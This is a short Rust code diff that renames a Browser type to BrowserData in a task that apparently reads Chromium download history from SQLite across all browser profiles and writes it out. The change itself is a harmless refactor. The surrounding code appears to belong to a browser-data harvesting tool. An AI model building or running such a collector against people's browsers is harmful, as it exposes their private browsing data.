@@ -1,4 +1,4 @@
-use crate::chromium::Browser;
+use crate::chromium::BrowserData;
 use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Download};
 use alloc::borrow::ToOwned;
 use alloc::boxed::Box;
@@ -13,11 +13,11 @@ const DOWNLOADS_CURRENT_PATH: usize = 2;
 const DOWNLOADS_TAB_URL: usize      = 16;
 
 pub(super) struct DownloadsTask {
-    browser: Arc<Browser>
+    browser: Arc<BrowserData>
 }
 
 impl DownloadsTask {
-    pub(super) fn new(browser: Arc<Browser>) -> Self {
+    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
         Self { browser }
     }
 }
